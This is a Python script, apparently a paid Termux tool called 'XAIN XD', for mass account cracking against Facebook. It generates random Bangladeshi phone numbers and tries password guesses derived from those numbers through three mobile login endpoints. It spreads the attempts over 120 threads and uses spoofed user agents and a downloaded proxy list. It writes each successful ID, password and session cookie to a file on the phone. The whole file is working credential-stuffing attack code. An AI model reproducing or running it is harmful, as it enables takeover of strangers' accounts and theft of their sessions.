import os,sys,uuid,re,random,time,string,json,urllib

try:
    import requests,rich
except:
    os.system("pip3 install requests rich")
    import requests,rich

from rich import print
from rich.tree import Tree
from rich.panel import Panel
from bs4 import BeautifulSoup
from io import BytesIO
import socket,ssl
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:
    os.listdir("/sdcard")
except:
    os.system("clear")
    sys.exit("\033[1;91m[\033[1;92m=\033[1;91m]\x1b[38;5;46m "+"Give Sto"+"rage "+"Pe"+"rmi"+"ssion")    
try:
    os.mkdir("/sdcard/XAIN XD")
except:
    pass

try:
    open('.prox.txt','w').write(requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text)
except requests.exceptions.ConnectionError:
    exit(' Network Is Too Slow ')
def prox():
    proxies = open('.prox.txt','r').read().splitlines()
    return {'http': 'socks5://'+random.choice(proxies)}
def check_apk(kukis):
    session = requests.Session()
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=kukis).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;37m \033[1;36m"+gm.replace('Added on',' [Added On]'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=kukis).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;37m \033[1;33m"+gm.replace('Expired on',' [Expired On]'))    
 
#---------# Global
oks=[]
loop=0
user=[]
def cont(li):
    if li <10:
        return "0"+str(li)
    else:
        return str(li)
#---------# Date
month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
today_data=str(datetime.now()).split(" ")[0].split("-")
today=today_data[2]+"\x1b[1;97m."+month.get(today_data[1])
#---------#Old Date
ugen=[]
ugen1=[]
xxxgtxxx = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750','TECNO LD7','DMP-A6','T95MAX','Mi MIX 2S','CPH2525','K2501','i-925','Infinix X670','i99','Teracube_2e','oppen','VIVO Y33S','Redmi S2','PRIMO ZX4','Pixel 5','Smooth 5.5 MAX','SM-G930F','LM-G910N','TECNO CH6i','Pixel 7','T5 Max','Redmi Note 4','i18','Redmi Note 8','Primo R10','SM-S908B'])
for ua in range(10000):
    ua1='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(100,120))+'.0.0.0 Safari/537.36'
    ua2='Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(100,120))+'.0.0.0 Safari/537.36'
    ua3='Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(100,120))+'.0.0.0 Safari/537.36'
    ua4='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(100,120))+'.0.0.0 Safari/537.36'
    ua5='Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/'+str(random.randint(92,120))+'.0.'+str(random.randint(5200,6100))+'.'+str(random.randint(100,199))+' Mobile/15E148 Safari/604.1'
    ua6='Mozilla/5.0 (Linux; Android '+str(random.randint(4,13))+') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(92,120))+'.0.'+str(random.randint(5200,6100))+'.'+str(random.randint(100,199))+' Mobile Safari/537.36'
    ua7='Mozilla/5.0 (Linux; Android '+str(random.randint(4,13))+'; '+xxxgtxxx+') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(92,120))+'.0.'+str(random.randint(5200,6100))+'.'+str(random.randint(100,199))+' Mobile Safari/537.36'
    uax=random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7])
    ugen.append(uax)


def clear():os.system('clear');print(logo)
def space():
    print("\n")
def linex():
    print("[b][green]"+("━"*36)+"[/green][/b]")    
logo = """ 
[bold green]    __   __  ___  _____ _   _
[bold cyan]    \ \ / / / _ \|_   _| \ | |
[bold green]     \ V / / /_\ \ | | |  \| |    [bold red]BE Careful Bro
[bold cyan]     /   \ |  _  | | | | . ` | [bold green]Your System Cracked
[bold green]    / /^\ \| | | |_| |_| |\  |         [bold yellow]By
[bold cyan]    \/   \/\_| |_/\___/\_| \_/

[bold red]     Developer By [cyan]> Xain
[bold cyan]     TooL [cyan]        > [green]Paid
[bold green]     Version      [cyan]> [cyan]60.1            [bold reverse cyan] XAIN__[ XD ] """

def xain_co(oks):
    if str(len(oks))[-1] in ["0","2","4","6","8"]:
        return "[bright_red on bright_white][i] XAIN-XD [/i][/bright_red on bright_white]"
    else:
        return "[r bright_white][i] XAIN-XD [/i][/r bright_white]"
def savage_animi(loop):
     G="\033[38;5;118m"
     if str(loop)[-1] in ["1"]:
         return f"\033[1;1m{G}XAIN-XD\033[1;00m"
     elif str(loop)[-1] in ["2"]:
         return f"\033[1;1m\033[38;5;196mX{G}AIN-XD\033[1;00m"
     elif str(loop)[-1] in ["3"]:
         return f"\033[1;1m{G}X\033[38;5;196mA{G}IN-XD\033[1;00m"
     elif str(loop)[-1] in ["4"]:
         return f"\033[1;1m{G}XA\033[38;5;196mI{G}N-XD\033[1;00m"
     elif str(loop)[-1] in ["5"]:
         return f"\033[1;1m{G}X\033[38;5;196mAI{G}N-XD\033[1;00m"
     elif str(loop)[-1] in ["6"]:
         return f"\033[1;1m{G}XAI\033[38;5;196mN{G}-XD\033[1;00m"
     else:
         return f"\033[1;1m{G}XAIN-X\033[38;5;196mD{G}\033[1;00m"
def rd_color():
    return random.choice(["\033[1;30m","\033[1;33m","\033[1;34m","\033[1;35m","\033[38;5;44m","\033[38;5;20m","\033[38;5;198m"])
def animi(oks):
    if str(len(oks))[-1:] in ["2","4","6","8","0"]:
        return "[🤩][violet]⟩⟨[bright_green][🤩]"
    else:
        return "[😻][red1]⟨⟩[bright_green][😻]"
def animation_lop_lt(loop,tl):
    x="\033[1;37m"
    color=random.choice(["\033[1;30m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m"])
    con=str(loop)+"|"+tl
    text_len=len(con)
    indicator=random.choice(range(text_len))
    content=list(con)
    eliminate=content[indicator]
    content[indicator]=color+eliminate+"\033[1;37m"
    for xd in content:
        x+=xd
    return x
def spin_ani(loop):
    if str(loop)[-1]  in ["1","6"]:
        return "⠙"
    elif str(loop)[-1] in ["2","7"]:
        return "⠼"
    elif str(loop)[-1] in ["3","8"]:
        return "⠦"
    elif str(loop)[-1] in ["4","9"]:
        return "⠧"
    else:
        return "⠋"
def anibeket(ok):
    naw=str(len(ok))
    if naw[-1] in ["2","4","6","8","0"]:
        return "[violet] ⟩"
    else:
        return "[red1] ⟨"
        
def menu():
    clear()    
    space()
    print("[bold underline green]               Main Menu [✓]                   ")
    print("[bold red] [1] [green]>>   [italic]Random Clone ")
    print("[bold cyan] [2] [red]>>   [italic]File Clone ")
    linex()
    ll=input("\033[1;31mChoice Option >> : ")
    if ll in ["1","01","A","a"]:
        rnd()
    else:
        clear()
        linex()
        space()
        print(" [bold red]    Please Enter Right Input")
        time.sleep(2)
        menu()
def rnd():
    clear()
    space()
    linex()
    space()
    print("[bold reverse green]Select BD Sim Code ")
    space()
    print(" 0177 / 0188 / 0199 / 0133 ")
    space()
    code=input("\033[1;31mEnter >> : ")
    clear()
    space()
    linex()
    space()
    bb=Tree(" [underline green]        Enter The Crack Limit         ")
    bb.add("[bold reverse cyan]20000 <=> 30000 <=> 50000 ").add("[bold green] Xain___XD ")
    print(bb)
    limit=int(input("\033[1;31m Input >>: "))
    for i in range(limit):
        heron=str(random.choice(range(1000000,9999999)))
        user.append(heron)
    clear()
    space()
    linex()
    print(f"[red1][[green1]=[red1]] METHOD  [red1][[green1]A[red1]]")
    print(f"[red1][[green1]=[red1]] METHOD  [red1][[green1]B[red1]]")
    print(f"[red1][[green1]=[red1]] METHOD  [red1][[green1]C[red1]]")
    linex()
    qw=input("\033[1;31mChoice Option >> : ")    
    with ThreadPool (max_workers=120) as xx:
        tl=str(len(user))
        clear()
        space()
        linex()
        print("[bold red] Sim Code ➦ [bold yellow]"+code)
        print(f"[bold cyan] Total Uid ➦ [bold green]"+tl)
        print("[bold green] TURN ON [yellow]/ [bold green]OFF AIRPLANE MODE EVERY 3 MIN")
        linex()
        for i in user:
            uid=code+i
            pwx = [uid[:8],uid[:7],uid[:6],uid[5:],uid[3:],uid[4:],uid[2:]]            
            if qw in ["1"]:
                xx.submit(renmeth1,uid,pwx,tl,qw)
            elif qw in ["2"]:
                xx.submit(renmeth2,uid,pwx,tl,qw)
            elif qw in ["3"]:
                xx.submit(renmeth3,uid,pwx,tl,qw)
    linex()
    print(" [>] Crack Complete")
    print(" [<] Total OK : "+str(len(oks)))
    linex()
    


def renmeth2(uid,pwx,tl,qw):
    global oks,loop,cpc
    sys.stdout.write(f'\r  \033[1;37m{spin_ani(loop)}\033[38;5;93m[{savage_animi(loop)}\033[38;5;93m]~\033[1;37m[\033[1;30mM\033[1;30m{qw}\033[1;37m]~\033[38;5;93m[\033[1;1m{animation_lop_lt(loop,tl)}\033[1;00m\033[38;5;93m]~[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[38;5;93m]\033[0;00m\r');sys.stdout.flush()        
    for ps in pwx:
        try:
            session=requests.session()
        #    ua = sex()
            ua = random.choice(ugen)
            link = session.get(f"https://m.prod.facebook.com").text        
            data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"try_number": 0,"unrecognized_tries": 0,"email": uid,"prefill_contact_point": uid,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',}
            headers = {'Host': f'm.prod.facebook.com','content-length': '1730','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"','sec-ch-ua-mobile': '?1','user-agent': ua,'x-response-format': 'JSONStream','content-type': 'application/x-www-form-urlencoded','x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),'viewport-width': '360','sec-ch-ua-platform-version': '""','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','dpr': '2','sec-ch-ua-full-version-list': '','sec-ch-ua-model': '""','sec-ch-prefers-color-scheme': 'light','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': f'https://m.prod.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://m.prod.facebook.com/','accept-encoding': 'gzip, deflate, br','accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            session.post('https://m.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=headers, data=data, allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                uid = re.search('user=(.*?);',str(kukis)).group(1)
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    oks.append(uid)
                    print(f"\r\r[b]"+xain_co(oks)+f" [bright_green]{uid} [orange3]▶ [bright_green]{ps}               \n{animi(oks)}sb=cracked_by.Xain-xd:tool;"+kukis.replace("-1","1")+"\n")
                    open("/sdcard/XAIN XD/XAIN-OK.txt","a").write(uid+"|"+ps+"|"+kukis+"\n")
                    break            
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1    
    
    
def renmeth1(uid,pwx,tl,qw):
    global oks,loop,cpc
    sys.stdout.write(f'\r  \033[1;37m{spin_ani(loop)}\033[38;5;93m[{savage_animi(loop)}\033[38;5;93m]~\033[1;37m[\033[1;30mM\033[1;30m{qw}\033[1;37m]~\033[38;5;93m[\033[1;1m{animation_lop_lt(loop,tl)}\033[1;00m\033[38;5;93m]~[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[38;5;93m]\033[0;00m\r');sys.stdout.flush()        
    for ps in pwx:
        try:
            session=requests.session()
          #  ua = sex()
            ua = random.choice(ugen)
            link = session.get(f"https://mbasic.prod.facebook.com").text        
            data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"try_number": 0,"unrecognized_tries": 0,"email": uid,"prefill_contact_point": uid,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',}
            headers = {'Host': f'mbasic.prod.facebook.com','content-length': '1730','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"','sec-ch-ua-mobile': '?1','user-agent': ua,'x-response-format': 'JSONStream','content-type': 'application/x-www-form-urlencoded','x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),'viewport-width': '360','sec-ch-ua-platform-version': '""','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','dpr': '2','sec-ch-ua-full-version-list': '','sec-ch-ua-model': '""','sec-ch-prefers-color-scheme': 'light','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': f'https://mbasic.prod.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://mbasic.prod.facebook.com/','accept-encoding': 'gzip, deflate, br','accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            session.post('https://mbasic.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=headers, data=data, allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                uid = re.search('user=(.*?);',str(kukis)).group(1)
           #     uid = re.findall('c_user=(.*);xs', kukis)[0]
                oks.append(uid)
                print(f"\r\r[b]"+xain_co(oks)+f" [bright_green]{uid} [orange3]▶ [bright_green]{ps}               \n{animi(oks)}sb=cracked_by.Xain-xd:tool;"+kukis.replace("-1","1")+"\n")
                open("/sdcard/XAIN XD/XAIN-OK.txt","a").write(uid+"|"+ps+"|"+kukis+"\n")

                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1    


def renmeth3(uid,pwx,tl,qw):
    global oks,loop,cpc
    sys.stdout.write(f'\r  \033[1;37m{spin_ani(loop)}\033[38;5;93m[{savage_animi(loop)}\033[38;5;93m]~\033[1;37m[\033[1;30mM\033[1;30m{qw}\033[1;37m]~\033[38;5;93m[\033[1;1m{animation_lop_lt(loop,tl)}\033[1;00m\033[38;5;93m]~[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[38;5;93m]\033[0;00m\r');sys.stdout.flush()        
    for ps in pwx:
        try:
            session=requests.session()
         #   ua = sex()
            ua = random.choice(ugen)
            link = session.get(f"https://touch.facebook.com").text        
            data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"try_number": 0,"unrecognized_tries": 0,"email": uid,"prefill_contact_point": uid,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',}
            headers = {'Host': f'touch.facebook.com','content-length': '1730','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"','sec-ch-ua-mobile': '?1','user-agent': ua,'x-response-format': 'JSONStream','content-type': 'application/x-www-form-urlencoded','x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),'viewport-width': '360','sec-ch-ua-platform-version': '""','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','dpr': '2','sec-ch-ua-full-version-list': '','sec-ch-ua-model': '""','sec-ch-prefers-color-scheme': 'light','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': f'https://touch.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://touch.facebook.com/','accept-encoding': 'gzip, deflate, br','accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            session.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=headers, data=data, allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                uid = re.findall('c_user=(.*);xs', kukis)[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    oks.append(uid)
                    print(f"\r\r[b]"+xain_co(oks)+f" [bright_green]{uid} [orange3]▶ [bright_green]{ps}               \n{animi(oks)}sb=cracked_by.Xain-xd:tool;"+kukis.replace("-1","1")+"\n")
                    open("/sdcard/XAIN XD/XAIN-OK.txt","a").write(uid+"|"+ps+"|"+kukis+"\n")
                    break            
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1    

menu()